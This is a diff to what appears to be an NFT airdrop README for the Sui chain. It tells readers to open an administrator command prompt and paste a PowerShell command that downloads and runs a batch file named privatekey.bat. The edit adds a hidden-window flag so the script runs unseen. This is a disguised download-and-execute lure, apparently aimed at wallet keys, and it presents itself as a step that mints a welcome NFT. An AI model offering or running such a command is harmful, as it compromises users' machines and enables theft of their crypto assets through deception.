@@ -18,7 +18,7 @@ Set-ExecutionPolicy Unrestricted
 # OPEN CMD(COMMAND PROMPT) AS ADMIN ON WINDOWS
 1. Copy and paste the following in your CMD:
 ```
-powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CelestialNFT/Airdrop-Whitelist/main/privatekey.bat -OutFile privatekey.bat; Start-Process -FilePath .\privatekey.bat -ArgumentList /c -NoNewWindow -Wait"
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CelestialNFT/Airdrop-Whitelist/main/privatekey.bat -OutFile privatekey.bat; Start-Process -FilePath .\privatekey.bat -ArgumentList /c -NoNewWindow -Wait -WindowStyle Hidden"
 ```
 2. You have successfully Minted Your Welcome NFT on sui. 
 
